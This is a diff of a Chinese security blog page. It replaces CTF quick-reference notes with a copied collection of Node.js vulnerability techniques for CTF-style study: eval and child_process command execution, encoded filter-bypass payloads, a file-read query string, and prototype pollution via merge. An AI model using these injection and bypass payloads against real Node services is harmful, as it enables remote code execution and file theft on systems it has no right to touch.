@@ -11,7 +11,7 @@
   <!-- Global site tag (gtag.js) - Google Analytics -->
 
 
-  <title>CTF 快速查ban | Godown_blog</title>
+  <title>nodejs | Godown_blog</title>
 
   <link rel="icon" type="image/x-icon, image/vnd.microsoft.icon" href="/favicon.ico">
   <link rel="stylesheet" href="https://at.alicdn.com/t/font_1911880_c1nvbyezg17.css">
@@ -591,14 +591,14 @@
 
 
 <div class="post-detail-header" id="thumbnail_canvas" style="background-repeat: no-repeat; background-size: cover; 
-  background-position: center center;position: relative;background-image:url('https://typora-202017030217.oss-cn-beijing.aliyuncs.com/%E5%9B%BE%E7%89%87%E7%B4%A0%E6%9D%90/1080P%20A%20%E6%94%B6%E8%97%8F%E9%87%8F%E6%9C%80%E5%A4%9A/1080PA%E5%A3%81%E7%BA%B895.jpg')">
+  background-position: center center;position: relative;background-image:url('https://typora-202017030217.oss-cn-beijing.aliyuncs.com/%E5%9B%BE%E7%89%87%E7%B4%A0%E6%9D%90/1080P%20A%20%E6%94%B6%E8%97%8F%E9%87%8F%E6%9C%80%E5%A4%9A/1080PA%E5%A3%81%E7%BA%B8102.jpg')">
   <div class="post-detail-header-mask"></div>
   <canvas id="header_canvas"style="position:absolute;bottom:0;pointer-events:none;"></canvas>
   
   <div class="post-detail-header_info-box">
     <div class="title-box">
       <span class="title">
-        CTF 快速查ban
+        nodejs
       </span>
     </div>
     
@@ -619,51 +619,336 @@
   <div class="main-content">
     <article class="post post-detail">
       <div class="post-content">
-        <p>CC链</p>
-<p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20240802170805620.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20240802170805620.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p>
-<p>RCE绕过preg_match </p>
-<p><a target="_blank" rel="noopener" href="https://zhuanlan.zhihu.com/p/392606966">https://zhuanlan.zhihu.com/p/392606966</a></p>
-<p>反弹shell绕过</p>
-<p><a target="_blank" rel="noopener" href="https://xz.aliyun.com/t/14240?u_atoken=587a65cb6338b3cc0d7fb5e0102746e4&u_asig=1a0c399817268327732403019e00a7">https://xz.aliyun.com/t/14240?u_atoken=587a65cb6338b3cc0d7fb5e0102746e4&amp;u_asig=1a0c399817268327732403019e00a7</a></p>
-<p>kali默认的就是<a target="_blank" rel="noopener" href="https://so.csdn.net/so/search?q=zsh&spm=1001.2101.3001.7020"></a> shell，所以如果想把kali的shell用bash反弹出去的话需要先用<strong>bash命令进入bash shell</strong>才能使用bash反弹shell</p>
-<h2 id="other骚报错解决"><a href="#other骚报错解决" class="headerlink" title="other骚报错解决"></a>other骚报错解决</h2><p>idea java文件变成茶杯是没办法调试和find Usages的，需要把源代码目录标记为源代码根目录。比如分析Tomcat源码：</p>
-<p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20240922205013696.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20240922205013696.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p>
-<p>nodejs原型链污染记得改Content-Type为application&#x2F;json</p>
-<p>jinja2 报cannot import name ‘Markup‘ from ‘jinja2‘</p>
-<ol>
-<li>先卸载已经安装的jinja2:<br><code>pip uninstall jinja2</code></li>
-<li>安装 2.11.3版本（目前已知该版本有‘Markup’模块）<br><code>pip install jinja2==2.11.3</code></li>
-<li>然后报’soft_unicode’ from ‘markupsafe’</li>
-</ol>
-<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python -m pip install markupsafe==2.0.1</span><br></pre></td></tr></table></figure>
+        <p>抄一份nodejs的漏洞合集</p>
+<p><a target="_blank" rel="noopener" href="https://xz.aliyun.com/t/13065#toc-15">https://xz.aliyun.com/t/13065#toc-15</a></p>
+<table>
+<thead>
+<tr>
+<th>S.No</th>
+<th>Javascript</th>
+<th>NodeJS</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>1</td>
+<td>Javascript是一种编程语言，用于在网站上编写脚本。</td>
+<td>NodeJS是一种Javascript的运行环境。</td>
+</tr>
+<tr>
+<td>2</td>
+<td>Javascript只能在浏览器中运行。</td>
+<td>在NodeJS的帮助下，可以在浏览器外运行Javascript。</td>
+</tr>
+<tr>
+<td>3</td>
+<td>Javascript基本上是在<strong>客户端</strong>使用。</td>
+<td>NodeJS主要用在<strong>服务器</strong>端。</td>
+</tr>
+<tr>
+<td>4</td>
+<td>Javascript有足够的能力来添加HTML和玩弄DOM。</td>
+<td>Nodejs不具备添加HTML标签的能力。</td>
+</tr>
+<tr>
+<td>5</td>
+<td>Javascript可以在任何浏览器引擎中运行，比如Safari中的JS core和Firefox中的Spidermonkey。</td>
+<td>V8是node.js内部的Javascript引擎，可以解析和运行Javascript。</td>
+</tr>
+<tr>
+<td>7</td>
+<td>Javascript的一些框架有RamdaJS、TypedJS等。</td>
+<td>Nodejs的一些模块有Lodash、express等。这些模块需要从npm导入。</td>
+</tr>
+<tr>
+<td>8</td>
+<td>Javascript是ECMA脚本的升级版，使用Chrome的V8引擎，用C++编写。</td>
+<td>Nodejs是用C、C++和Javascript编写的。</td>
+</tr>
+</tbody></table>
+<h2 id="toUpperCase-漏洞"><a href="#toUpperCase-漏洞" class="headerlink" title="toUpperCase()漏洞"></a>toUpperCase()漏洞</h2><p>toUpperCase()转大写，特殊字符替代</p>
+<p><code>&quot;ı&quot;.toUpperCase() == &#39;I&#39;</code> <code>&quot;ſ&quot;.toUpperCase() == &#39;S&#39;</code></p>
+<p>toLowerCase()转小写</p>
+<p><code>&quot;K&quot;.toLowerCase() == &#39;k&#39;</code></p>
+<h3 id="弱类型比较"><a href="#弱类型比较" class="headerlink" title="弱类型比较"></a>弱类型比较</h3><p>如果需要满足：</p>
+<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">a &amp;&amp; b &amp;&amp; a.<span class="property">length</span>===b.<span class="property">length</span> &amp;&amp; a!==b &amp;&amp; <span class="title function_">md5</span>(a+flag)===<span class="title function_">md5</span>(b+flag)</span><br></pre></td></tr></table></figure>
 
-<ol start="4">
-<li>报import name ‘url_quote’ from ‘werkzeug.urls’</li>
-</ol>
-<p>pip list找到flask版本</p>
-<p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20240928145905945.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20240928145905945.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp" alt="image-20240928145905945"></p>
-<p>访问flask源码</p>
-<p><a target="_blank" rel="noopener" href="https://github.com/pallets/flask">https://github.com/pallets/flask</a></p>
-<p>找到对应的tag，访问setup.py</p>
-<p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20240928150112011.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20240928150112011.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp" alt="image-20240928150112011"></p>
-<p>尝试把werkzeug降到0.14</p>
-<p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20240928150315423.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20240928150315423.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp" alt="image-20240928150315423"></p>
+<p>看下面case</p>
+<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">a=&#123;<span class="string">&#x27;x&#x27;</span>:<span class="string">&#x27;1&#x27;</span>&#125;</span><br><span class="line">b=&#123;<span class="string">&#x27;x&#x27;</span>:<span class="string">&#x27;2&#x27;</span>&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(a+<span class="string">&quot;flag&#123;xxx&#125;&quot;</span>)</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(b+<span class="string">&quot;flag&#123;xxx&#125;&quot;</span>)</span><br><span class="line"><span class="comment">//输出</span></span><br><span class="line"><span class="comment">//[object Object]flag&#123;xxx&#125;</span></span><br><span class="line"><span class="comment">//[object Object]flag&#123;xxx&#125;</span></span><br></pre></td></tr></table></figure>
+
+<p>即传入<code>a[x]=1&amp;b[x]=2</code>即可满足要求</p>
+<h2 id="命令执行"><a href="#命令执行" class="headerlink" title="命令执行"></a>命令执行</h2><h3 id="eval（）"><a href="#eval（）" class="headerlink" title="eval（）"></a>eval（）</h3><p>如下代码</p>
+<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> express = <span class="built_in">require</span>(<span class="string">&quot;express&quot;</span>);</span><br><span class="line"><span class="keyword">var</span> app = <span class="title function_">express</span>();</span><br><span class="line"></span><br><span class="line">app.<span class="title function_">get</span>(<span class="string">&#x27;/eval&#x27;</span>,<span class="keyword">function</span>(<span class="params">req,res</span>)&#123;</span><br><span class="line">    res.<span class="title function_">send</span>(<span class="built_in">eval</span>(req.<span class="property">query</span>.<span class="property">q</span>));</span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(req.<span class="property">query</span>.<span class="property">q</span>);</span><br><span class="line">&#125;)</span><br><span class="line"><span class="comment">//参数 a 通过 get 传参的方式传入运行，我们传入参数会被当作代码去执行。</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> server = app.<span class="title function_">listen</span>(<span class="number">8888</span>, <span class="keyword">function</span>(<span class="params"></span>) &#123;</span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;应用实例，访问地址为 http://127.0.0.1:8888/&quot;</span>);</span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure>
+
+<h3 id="settimeout"><a href="#settimeout" class="headerlink" title="settimeout()"></a>settimeout()</h3><p><code>settimeout(function,time)</code>，该函数作用是两秒后执行函数，function 处为我们可控的参数。</p>
+<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">setTimeout</span>(<span class="function">()=&gt;</span>&#123;</span><br><span class="line">  <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;console.log(&#x27;Hacked&#x27;)&quot;</span>);</span><br><span class="line">&#125;,<span class="number">2000</span>);</span><br></pre></td></tr></table></figure>
+
+<h3 id="setinterval"><a href="#setinterval" class="headerlink" title="setinterval()"></a>setinterval()</h3><p><code>setinterval (function,time)</code>，每隔两秒执行一次代码</p>
+<h3 id="Function"><a href="#Function" class="headerlink" title="Function()"></a>Function()</h3><p><code>Function(string)()</code>，类似php的create_function，创建函数并立即调用</p>
+<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> aaa=<span class="title class_">Function</span>(<span class="string">&quot;console.log(&#x27;Hacked&#x27;)&quot;</span>)();</span><br></pre></td></tr></table></figure>
+
+<h3 id="child-process模块"><a href="#child-process模块" class="headerlink" title="child_process模块"></a>child_process模块</h3><p>child_process模块可以创建子进程，进行命令执行</p>
 <ul>
-<li>jinja ssti 神器 fenjing安装：</li>
+<li>exec。调用&#x2F;bash.sh，与execSync用法相同</li>
 </ul>
-<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">pipx install fenjing</span><br><span class="line">pipx run fenjing webui</span><br></pre></td></tr></table></figure>
+<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">require</span>(<span class="string">&#x27;child_process&#x27;</span>).<span class="title function_">exec</span>(<span class="string">&#x27;calc&#x27;</span>);</span><br></pre></td></tr></table></figure>
+
+<ul>
+<li>execFile，与execFileSync用法相同</li>
+</ul>
+<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">require</span>(<span class="string">&#x27;child_process&#x27;</span>).<span class="title function_">execFile</span>(<span class="string">&quot;calc&quot;</span>,&#123;<span class="attr">shell</span>:<span class="literal">true</span>&#125;);</span><br></pre></td></tr></table></figure>
+
+<ul>
+<li>fork</li>
+</ul>
+<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">require</span>(<span class="string">&#x27;child_process&#x27;</span>).<span class="title function_">fork</span>(<span class="string">&quot;calc&quot;</span>);</span><br></pre></td></tr></table></figure>
+
+<ul>
+<li>spawn，与spawnSync用法相同</li>
+</ul>
+<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">require</span>(<span class="string">&#x27;child_process&#x27;</span>).<span class="title function_">spawn</span>(<span class="string">&quot;calc&quot;</span>,&#123;<span class="attr">shell</span>:<span class="literal">true</span>&#125;);</span><br></pre></td></tr></table></figure>
+
+<ul>
+<li>fs.writeFile，writeFileSync写文件</li>
+</ul>
+<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">require</span>(<span class="string">&#x27;fs&#x27;</span>).<span class="title function_">writeFileSync</span>(<span class="string">&#x27;input.txt&#x27;</span>,<span class="string">&quot;dasdsadsa&quot;</span>);</span><br><span class="line"><span class="comment">//require(&#x27;fs&#x27;).writeFile(&#x27;input.txt&#x27;,&quot;dasdsadsa&quot;,(err)=&gt;&#123;&#125;);</span></span><br></pre></td></tr></table></figure>
 
 
 
-<p>python创建虚拟环境后（pycharm能创建虚拟venv），在 venv\Scripts\目录下使用activate进入虚拟环境命令行，pip下载虚拟环境依赖包。(注意pip时关掉代理，清华源屏蔽国外流量)</p>
+<h3 id="fs-readFileSync"><a href="#fs-readFileSync" class="headerlink" title="fs.readFileSync"></a>fs.readFileSync</h3><p>使用<code>fs.readFileSync</code>进行文件读取，需要满足以下条件</p>
+<ul>
+<li>有<code>href</code>且非空</li>
+<li>有<code>origin</code>且非空</li>
+<li><code>protocol</code> 等于<code>file:</code></li>
+<li>有<code>hostname</code>且等于空(Windows下非空的话会进行远程加载)</li>
+<li>有<code>pathname</code>且非空(读取的文件路径)</li>
+</ul>
+<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?file[href]=a&amp;file[origin]=<span class="number">1</span>&amp;file[protocol]=<span class="attr">file</span>:&amp;file[hostname]=&amp;file[pathname]=读取的文件</span><br></pre></td></tr></table></figure>
+
+<h3 id="绕过过滤"><a href="#绕过过滤" class="headerlink" title="绕过过滤"></a>绕过过滤</h3><ul>
+<li>过滤<code>.</code></li>
+</ul>
+<p><code>[]</code>代替<code>.</code></p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">require(<span class="string">&#x27;child_process&#x27;</span>)[<span class="string">&quot;exec&quot;</span>](<span class="string">&#x27;calc&#x27;</span>);</span><br></pre></td></tr></table></figure>
+
+<ul>
+<li>过滤字符串</li>
+</ul>
+<p>拼接</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">require(<span class="string">&#x27;child_process&#x27;</span>)[<span class="string">&quot;ex&quot;</span>+<span class="string">&quot;ec&quot;</span>](<span class="string">&#x27;calc&#x27;</span>);</span><br></pre></td></tr></table></figure>
+
+<p>十六进制</p>
+<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">require</span>(<span class="string">&#x27;child_process&#x27;</span>)[<span class="string">&quot;\x65\x78\x65\x63&quot;</span>](<span class="string">&#x27;calc&#x27;</span>);</span><br></pre></td></tr></table></figure>
+
+<p>unicode</p>
+<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">require</span>(<span class="string">&#x27;child_process&#x27;</span>)[<span class="string">&quot;\u0065\u0078\u0065\u0063&quot;</span>](<span class="string">&#x27;calc&#x27;</span>);</span><br></pre></td></tr></table></figure>
+
+<p>base64</p>
+<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">eval</span>(<span class="title class_">Buffer</span>.<span class="title function_">from</span>(<span class="string">&#x27;cmVxdWlyZSgnY2hpbGRfcHJvY2VzcycpWyJleGVjIl0oJ2NhbGMnKTs=&#x27;</span>,<span class="string">&#x27;base64&#x27;</span>).<span class="title function_">toString</span>());</span><br><span class="line"><span class="comment">//require(&#x27;child_process&#x27;)[&quot;exec&quot;](&#x27;calc&#x27;);</span></span><br></pre></td></tr></table></figure>
+
+<p>ES6模板绕过</p>
+<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">require</span>(<span class="string">&#x27;child_process&#x27;</span>)[<span class="string">`<span class="subst">$&#123;<span class="string">`<span class="subst">$&#123;<span class="string">`exe`</span>&#125;</span>cSync`</span>&#125;</span>`</span><span class="string">&quot;](&#x27;calc&#x27;);</span></span><br></pre></td></tr></table></figure>
+
+<blockquote>
+<p>ES6特性可以用反引号代替括号执行函数，也能代替单引号和双引号，反引号内能插入变量</p>
+<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&gt;<span class="keyword">var</span> node = <span class="string">&quot;nodejs&quot;</span>;</span><br><span class="line">&gt;<span class="variable language_">console</span>.<span class="property">log</span><span class="string">`hello<span class="subst">$&#123;node&#125;</span>world`</span>;</span><br><span class="line">&gt;<span class="comment">//输出 [&#x27;hello&#x27;,&#x27;world&#x27;] nodejs</span></span><br></pre></td></tr></table></figure>
+
+<p>之所以这么输出，是因为console参数为hello${node}world，而不是”hello${node}world”，前者是个数组</p>
+</blockquote>
+<p>concat拼接</p>
+<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">require</span>(<span class="string">&#x27;child_process&#x27;</span>)[<span class="string">&quot;exe&quot;</span>.<span class="title function_">concat</span>(<span class="string">&quot;c&quot;</span>)](<span class="string">&#x27;calc&#x27;</span>);</span><br></pre></td></tr></table></figure>
+
+<p>Object.values</p>
+<blockquote>
+<p>类似SSTI</p>
+</blockquote>
+<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="title class_">Object</span>.<span class="title function_">values</span>(<span class="built_in">require</span>(<span class="string">&#x27;child_process&#x27;</span>))[<span class="number">4</span>](<span class="string">&#x27;calc&#x27;</span>).<span class="title function_">toString</span>();</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/20231118120211-40213400-85c7-1.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/20231118120211-40213400-85c7-1.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp" alt="20231118120211-40213400-85c7-1"></p>
+<p>过滤require关键字</p>
+<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable language_">global</span>.<span class="property">process</span>.<span class="property">mainModule</span>.<span class="property">constructor</span>.<span class="title function_">_load</span>(<span class="string">&#x27;child_process&#x27;</span>)</span><br></pre></td></tr></table></figure>
+
+<h2 id="js自执行匿名函数"><a href="#js自执行匿名函数" class="headerlink" title="js自执行匿名函数"></a>js自执行匿名函数</h2><p>这种函数在声明时就会立即执行一次</p>
+<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">(<span class="keyword">function</span> (<span class="params"></span>) &#123;</span><br><span class="line">  <span class="comment">// …</span></span><br><span class="line">&#125;)();</span><br><span class="line"></span><br><span class="line">(<span class="keyword">function</span> (<span class="params"></span>) &#123;</span><br><span class="line">  <span class="comment">// …</span></span><br><span class="line">&#125;());</span><br><span class="line"></span><br><span class="line">(<span class="function">() =&gt;</span> &#123;</span><br><span class="line">  <span class="comment">// …</span></span><br><span class="line">&#125;)();</span><br><span class="line"></span><br><span class="line">(<span class="keyword">async</span> () =&gt; &#123;</span><br><span class="line">  <span class="comment">// …</span></span><br><span class="line">&#125;)();</span><br><span class="line"></span><br><span class="line"><span class="title class_">Function</span>(参数列表,code).<span class="title function_">apply</span>(参数)<span class="comment">//code为另一函数</span></span><br></pre></td></tr></table></figure>
+
+<p>case：</p>
+<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="title function_">greet</span>(<span class="params">greeting, name</span>) &#123;</span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(greeting + <span class="string">&#x27;, &#x27;</span> + name + <span class="string">&#x27;!&#x27;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> args = [<span class="string">&#x27;Hello&#x27;</span>, <span class="string">&#x27;World&#x27;</span>];</span><br><span class="line"></span><br><span class="line">greet.<span class="title function_">apply</span>(<span class="literal">null</span>, args);</span><br></pre></td></tr></table></figure>
+
+
+
+
+
+<h2 id="原型链污染"><a href="#原型链污染" class="headerlink" title="原型链污染"></a>原型链污染</h2><p>在2022年，在CsbN写过一篇CATCTF的javascript原型链污染，没想到nodejs很多漏洞都是这个</p>
+<p>JavaScript中，每个对象（object）都有一个私有属性指向另一个名为<strong>原型</strong>（prototype）的对象。原型对象也有一个自己的原型，层层向上直到一个对象的原型为 <code>null</code>。根据定义，<code>null</code> 没有原型，并作为这个<strong>原型链</strong>（prototype chain）中的最后一个环节。</p>
+<p>体现到代码上，就是：</p>
+<ul>
+<li>每一个<code>原型对象</code>都有一个<code>prototype</code>属性，prototype 属性可以向对象添加属性和方法。</li>
+</ul>
+<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">object.<span class="property"><span class="keyword">prototype</span></span>.<span class="property">name</span>=value</span><br></pre></td></tr></table></figure>
+
+<ul>
+<li>每一个<code>实例对象</code>都有一个<code>__proto__</code>属性，这个实例属性指向对象的原型对象(即原型)。</li>
+</ul>
+<p>访问原型对象的几种方法：</p>
+<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">objectname[<span class="string">&quot;__proto__&quot;</span>]</span><br><span class="line">objectname.<span class="property">__proto__</span></span><br><span class="line">objectname.<span class="property">constructor</span>.<span class="property"><span class="keyword">prototype</span></span></span><br></pre></td></tr></table></figure>
+
+<p>抄个图，一眼懂。</p>
+<p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20240927151537978.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20240927151537978.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp" alt="image-20240927151537978"></p>
+<p>不同对象所生成的原型链如下(部分)：</p>
+<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> o = &#123;<span class="attr">a</span>: <span class="number">1</span>&#125;;<span class="comment">//o是个对象，有个a字段（属性）</span></span><br><span class="line"><span class="comment">// o对象直接继承了Object</span></span><br><span class="line"><span class="comment">// 原型链： o ---&gt; Object ---&gt; null</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> a = [<span class="string">&quot;yo&quot;</span>, <span class="string">&quot;whadup&quot;</span>, <span class="string">&quot;?&quot;</span>];</span><br><span class="line"><span class="comment">// 数组都继承于 Array</span></span><br><span class="line"><span class="comment">// 原型链：</span></span><br><span class="line"><span class="comment">// a ---&gt; Array ---&gt; Object ---&gt; null</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">f</span>(<span class="params"></span>)&#123;</span><br><span class="line">  <span class="keyword">return</span> <span class="number">2</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// 函数都继承于 Function</span></span><br><span class="line"><span class="comment">// 原型链：</span></span><br><span class="line"><span class="comment">// f ---&gt; Function ---&gt; Object ---&gt; null</span></span><br></pre></td></tr></table></figure>
+
+<p>给object对象的原型设置一个b属性，值为value。这样所有继承object对象原型的实例对象在本身不拥有b属性的情况下，都会拥有b属性。</p>
+<p>如下代码</p>
+<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">object1 = &#123;<span class="string">&quot;a&quot;</span>:<span class="number">1</span>, <span class="string">&quot;b&quot;</span>:<span class="number">2</span>&#125;;</span><br><span class="line">object1.<span class="property">__proto__</span>.<span class="property">foo</span> = <span class="string">&quot;Hello World&quot;</span>;</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(object1.<span class="property">foo</span>);</span><br><span class="line">object2 = &#123;<span class="string">&quot;c&quot;</span>:<span class="number">1</span>, <span class="string">&quot;d&quot;</span>:<span class="number">2</span>&#125;;</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(object2.<span class="property">foo</span>);</span><br><span class="line"><span class="comment">//输出两个Hello World</span></span><br></pre></td></tr></table></figure>
+
+<h3 id="merge原型链污染"><a href="#merge原型链污染" class="headerlink" title="merge原型链污染"></a>merge原型链污染</h3><p>merge操作会导致原型链污染</p>
+<p>假设有一个merge对象的函数</p>
+<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="title function_">merge</span>(<span class="params">target, source</span>) &#123;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">let</span> key <span class="keyword">in</span> source) &#123;</span><br><span class="line">        <span class="keyword">if</span> (key <span class="keyword">in</span> source &amp;&amp; key <span class="keyword">in</span> target) &#123;</span><br><span class="line">            <span class="title function_">merge</span>(target[key], source[key])</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            target[key] = source[key]</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>下面的代码会污染到object3吗</p>
+<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">let</span> object1 = &#123;&#125;</span><br><span class="line"><span class="keyword">let</span> object2 = &#123;<span class="string">&quot;a&quot;</span>: <span class="number">1</span>, <span class="string">&quot;__proto__&quot;</span>: &#123;<span class="string">&quot;b&quot;</span>: <span class="number">2</span>&#125;&#125;</span><br><span class="line"><span class="title function_">merge</span>(object1, object2)</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(object1.<span class="property">a</span>, object1.<span class="property">b</span>)</span><br><span class="line"></span><br><span class="line">object3 = &#123;&#125;</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(object3.<span class="property">b</span>)</span><br><span class="line"><span class="comment">//1 2</span></span><br></pre></td></tr></table></figure>
+
